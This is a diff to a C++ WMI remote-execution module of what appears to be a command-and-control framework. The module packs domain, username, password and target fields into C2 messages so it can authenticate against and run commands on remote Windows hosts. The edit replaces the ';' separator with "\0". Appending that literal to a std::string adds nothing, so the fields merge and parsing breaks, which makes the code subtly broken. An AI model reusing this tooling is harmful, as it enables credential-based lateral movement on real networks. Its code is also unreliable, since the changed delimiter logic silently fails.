@@ -90,11 +90,11 @@ int WmiExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
             }
 
             std::string cmd = domain;
-            cmd += ";";
+            cmd += "\0";
             cmd += username;
-            cmd += ";";
+            cmd += "\0";
             cmd += password;
-            cmd += ";";
+            cmd += "\0";
             cmd += target;
 
             c2Message.set_cmd(cmd);
@@ -128,9 +128,9 @@ int WmiExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
             }
 
             std::string cmd = domain;
-            cmd += ";";
+            cmd += "\0";
             cmd += dc;
-            cmd += ";";
+            cmd += "\0";
             cmd += target;
 
             c2Message.set_cmd(cmd);
@@ -176,7 +176,7 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 	std::string cmd = c2Message.cmd();
 
     std::vector<std::string> splitedList;
-    splitList(cmd, ";", splitedList);
+    splitList(cmd, "\0", splitedList);
     
     bool useToken=false;
     std::string authority="";
@@ -346,7 +346,6 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         pAuthIdentity->DomainLength = domainName.size();
 
         pAuthIdentity->Password = (unsigned char *)password.data();
-        // TODO try with password empty
         pAuthIdentity->PasswordLength = password.size();
 
         pAuthIdentity->Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;
